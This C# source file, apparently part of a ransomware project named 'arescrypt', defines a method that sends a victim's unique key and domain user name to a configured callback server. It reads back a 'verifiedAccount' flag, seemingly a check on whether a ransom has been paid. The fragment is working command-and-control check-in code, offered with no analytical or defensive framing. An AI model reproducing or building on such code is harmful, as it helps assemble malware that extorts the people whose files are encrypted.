using System;
using System.Net;
using Newtonsoft.Json.Linq;

namespace arescrypt
{
    class AccountManager
    {
        private UserData userData = new UserData();

        public bool CheckVerification()
        {
            string url = Configuration.callbackURL + 
                "?uniqueKey=" + userData.getUniqueKey() +
                "&userDomUser=" + Configuration.userDomUser;

            using (WebClient wb = new WebClient())
            {
                string response = wb.DownloadString(url);
                JToken jsonObject = JObject.Parse(response);
                return (bool)jsonObject.SelectToken("verifiedAccount");
            }
        }

        
    }
}
